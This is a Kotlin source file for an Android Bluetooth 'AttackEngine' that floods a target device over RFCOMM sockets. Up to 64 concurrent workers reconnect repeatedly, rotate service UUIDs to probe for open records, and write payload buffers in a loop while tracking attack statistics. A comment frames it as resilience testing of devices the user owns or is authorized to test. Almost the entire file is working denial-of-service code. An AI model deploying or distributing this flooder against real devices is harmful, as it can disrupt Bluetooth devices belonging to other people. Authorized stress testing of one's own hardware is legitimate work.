package api

import android.os.SystemClock
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.cancelAndJoin
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.SharedFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asSharedFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.runInterruptible
import kotlinx.coroutines.withTimeoutOrNull
import kotlinx.coroutines.yield
import java.io.IOException
import java.util.Collections
import java.util.UUID
import java.util.concurrent.atomic.AtomicInteger
import java.util.concurrent.atomic.AtomicLong
import kotlin.coroutines.coroutineContext

/**
 * Immutable snapshot of an attack run. Pure data (no Android types) so it can be unit tested
 * and safely handed to the UI layer.
 */
data class AttackStats(
    val running: Boolean = false,
    val activeWorkers: Int = 0,
    val connectAttempts: Long = 0L,
    val successfulConnections: Long = 0L,
    val failedConnections: Long = 0L,
    val bytesSent: Long = 0L,
    val elapsedMillis: Long = 0L,
) {
    /** Average payload throughput over the run so far, in bytes/second. */
    val bytesPerSecond: Long
        get() = if (elapsedMillis <= 0L) 0L else bytesSent * 1000L / elapsedMillis
}

/** One-off things worth telling the UI about, independent of the periodic stats stream. */
sealed interface AttackEvent {
    data class Started(val target: String, val workers: Int) : AttackEvent
    data class Log(val message: String) : AttackEvent
    data object Stopped : AttackEvent
}

/**
 * RFCOMM socket-flood engine used for controlled resilience testing of a device you own or are
 * authorized to test.
 *
 * The engine talks to [RfcommConnectionFactory]/[RfcommConnection] rather than to
 * `BluetoothSocket` directly, so its worker/retry/stop/stats logic is fully unit-testable with a
 * fake factory (see AttackEngineTest). Progress is exposed as [stats] (a [StateFlow]) and
 * [events] (a [SharedFlow]); the engine never touches views or a Context.
 *
 * @param clock monotonic millisecond source; injectable so tests don't depend on `SystemClock`.
 */
class AttackEngine(
    private val targetAddress: String,
    private val payloadSize: Int = DEFAULT_PAYLOAD_SIZE,
    private val connectTimeoutMs: Long = DEFAULT_CONNECT_TIMEOUT_MS,
    private val retryBackoffMs: Long = DEFAULT_RETRY_BACKOFF_MS,
    private val clock: () -> Long = { SystemClock.elapsedRealtime() },
) {

    companion object {
        const val DEFAULT_PAYLOAD_SIZE = 600
        const val DEFAULT_CONNECT_TIMEOUT_MS = 8_000L
        const val DEFAULT_RETRY_BACKOFF_MS = 100L
        const val MAX_WORKERS = 64
        private const val STATS_INTERVAL_MS = 250L

        // Base Serial Port Profile UUID; workers rotate the prefix when a connection fails.
        private val BASE_UUID: UUID = UUID.fromString("00001105-0000-1000-8000-00805F9B34FB")
    }

    private var scope: CoroutineScope? = null
    private var startedAt = 0L

    private val attempts = AtomicLong(0)
    private val successes = AtomicLong(0)
    private val failures = AtomicLong(0)
    private val bytes = AtomicLong(0)
    private val workersActive = AtomicInteger(0)

    // Every connection currently owned by a worker. Closing these unblocks native connect()/write().
    private val openConnections: MutableSet<RfcommConnection> =
        Collections.synchronizedSet(mutableSetOf())

    private val _stats = MutableStateFlow(AttackStats())
    val stats: StateFlow<AttackStats> = _stats.asStateFlow()

    private val _events = MutableSharedFlow<AttackEvent>(replay = 0, extraBufferCapacity = 256)
    val events: SharedFlow<AttackEvent> = _events.asSharedFlow()

    val isRunning: Boolean get() = scope?.isActive == true

    fun start(factory: RfcommConnectionFactory, workers: Int) {
        if (isRunning) return
        resetCounters()
        startedAt = clock()

        val newScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        scope = newScope

        val workerCount = workers.coerceIn(1, MAX_WORKERS)
        emit(AttackEvent.Started(targetAddress, workerCount))

        repeat(workerCount) { index -> newScope.launch { runWorker(factory, index + 1) } }
        newScope.launch { statsTicker() }
    }

    /** Stops the attack and suspends until all workers have actually finished. */
    suspend fun stopAndJoin() {
        val current = scope ?: return
        scope = null
        closeAllConnections()
        // Bounded join so a pathological blocked write can never wedge the caller (the UI).
        withTimeoutOrNull(2_000L) { current.coroutineContext[Job]?.cancelAndJoin() }
        finishStop()
    }

    /** Fire-and-forget stop for lifecycle teardown (ViewModel.onCleared). */
    fun cancel() {
        val current = scope ?: return
        scope = null
        closeAllConnections()
        current.cancel()
        finishStop()
    }

    private suspend fun statsTicker() {
        while (coroutineContext.isActive) {
            publishStats(running = true)
            delay(STATS_INTERVAL_MS)
        }
    }

    private suspend fun runWorker(factory: RfcommConnectionFactory, id: Int) {
        workersActive.incrementAndGet()
        var uuid = BASE_UUID
        try {
            while (coroutineContext.isActive) {
                var connection: RfcommConnection? = null
                try {
                    attempts.incrementAndGet()
                    connection = factory.create(uuid)
                    openConnections.add(connection)

                    val target = connection
                    val connected = withTimeoutOrNull(connectTimeoutMs) {
                        // connect() is blocking; runInterruptible makes it cancellable via
                        // thread interruption when the coroutine is cancelled/times out.
                        runInterruptible(Dispatchers.IO) { target.connect() }
                        true
                    } ?: false

                    if (connected && connection.isConnected) {
                        successes.incrementAndGet()
                        emit(AttackEvent.Log("[#$id] connected; sending payload"))
                        flood(connection)
                    } else {
                        failures.incrementAndGet()
                        uuid = nextProbeUuid()
                        emit(AttackEvent.Log("[#$id] connect timed out; retrying"))
                        delay(retryBackoffMs)
                    }
                } catch (e: CancellationException) {
                    throw e
                } catch (e: IOException) {
                    failures.incrementAndGet()
                    // Rotate the service-record UUID prefix to probe for an open record.
                    uuid = nextProbeUuid()
                    emit(AttackEvent.Log("[#$id] connect failed; retrying"))
                    delay(retryBackoffMs)
                } finally {
                    connection?.let { openConnections.remove(it) }
                    closeQuietly(connection)
                }
            }
        } finally {
            workersActive.decrementAndGet()
        }
    }

    private suspend fun flood(connection: RfcommConnection) {
        val buffer = ByteArray(payloadSize.coerceAtLeast(1)) { ((it % 40) + 'A'.code).toByte() }
        try {
            while (coroutineContext.isActive && connection.isConnected) {
                connection.write(buffer)
                bytes.addAndGet(buffer.size.toLong())
                // Cooperative suspension point so cancellation (Stop) takes effect promptly.
                yield()
            }
        } catch (e: IOException) {
            // Connection dropped; the worker loop will attempt to reconnect.
        }
    }

    private fun nextProbeUuid(): UUID =
        UUID.fromString(UUID.randomUUID().toString().substringBefore('-') + "-0000-1000-8000-00805F9B34FB")

    private fun resetCounters() {
        attempts.set(0)
        successes.set(0)
        failures.set(0)
        bytes.set(0)
        workersActive.set(0)
        _stats.value = AttackStats()
    }

    private fun finishStop() {
        workersActive.set(0)
        publishStats(running = false)
        emit(AttackEvent.Stopped)
    }

    private fun publishStats(running: Boolean) {
        _stats.value = AttackStats(
            running = running,
            activeWorkers = workersActive.get(),
            connectAttempts = attempts.get(),
            successfulConnections = successes.get(),
            failedConnections = failures.get(),
            bytesSent = bytes.get(),
            elapsedMillis = if (startedAt == 0L) 0L else clock() - startedAt,
        )
    }

    private fun closeAllConnections() {
        val snapshot = synchronized(openConnections) { openConnections.toList() }
        snapshot.forEach { closeQuietly(it) }
        openConnections.clear()
    }

    private fun emit(event: AttackEvent) {
        _events.tryEmit(event)
    }

    private fun closeQuietly(connection: RfcommConnection?) {
        try {
            connection?.close()
        } catch (e: IOException) {
            // ignore
        }
    }
}
